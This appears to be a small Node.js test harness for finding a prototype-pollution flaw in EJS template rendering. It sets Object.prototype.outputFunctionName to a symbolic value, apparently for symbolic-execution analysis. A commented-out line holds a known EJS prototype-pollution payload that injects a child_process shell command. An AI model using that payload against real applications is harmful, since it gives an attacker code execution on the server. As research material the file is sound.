const ejs = require('ejs')
const path = require('path');
const templatePath = path.join(__dirname, 'views', 'login_register.ejs');

var S$ = require('../../../lib/S$')
Object.prototype.outputFunctionName = S$.pureSymbol('outputFunctionName_undef')


// Object.prototype.outputFunctionName = "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"


var result = ejs.renderFile(templatePath, {
    title:" storeHtml | logins ",
    buttonHintF:"登 录",
    buttonHintS:"没有账号?",
    hint:"登录",
    next:"/register"
})